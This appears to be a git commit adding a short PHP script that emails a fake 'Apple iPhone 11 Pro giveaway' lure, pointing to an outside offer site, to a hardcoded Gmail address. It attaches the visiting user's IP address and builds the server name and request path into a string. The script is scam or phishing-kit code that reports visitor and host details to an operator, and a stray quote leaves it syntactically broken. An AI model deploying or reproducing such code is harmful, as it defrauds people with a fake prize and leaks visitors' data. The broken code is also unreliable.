37129a93444b90c731e04b920da2598c931474f9
firasdris54487 <61518027+firasdris54487@users.noreply.github.com>
2021-07-20 04:10:02 +0200

    Create Firasdris_Bot.php

---
+++ Firasdris_Bot.php
@@ -0,0 +1,6 @@
+<?php
+$tujuanmail = 'user54487215@gmail.com';
+$x_path = "Apple Giveaways 2021" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "To Get New Brand Iphone 11 PRO You Have To Viste https://jarba.com.mx And Complete The offer " ]";
+mail($tujuanmail, "Giveaways By Aplle IPhone 11 Pro 2021 Worldwide", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
